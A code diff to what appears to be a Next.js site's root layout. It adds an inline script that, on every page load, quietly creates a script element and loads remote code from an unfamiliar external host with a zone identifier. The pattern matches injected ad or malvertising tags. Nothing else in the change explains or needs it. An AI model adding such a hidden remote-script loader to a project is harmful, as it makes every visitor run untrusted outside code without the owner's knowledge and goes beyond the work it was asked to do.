@@ -100,7 +100,9 @@ export default function RootLayout({
   return (
     <html lang="en" className="dark">
       <body className="font-sans antialiased">
-
+ 
+ 
+        <script dangerouslySetInnerHTML={{ __html: "(function(s){s.dataset.zone='10397468',s.src='https://bvtpk.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))" }} />
 
         <Header />
         {children}
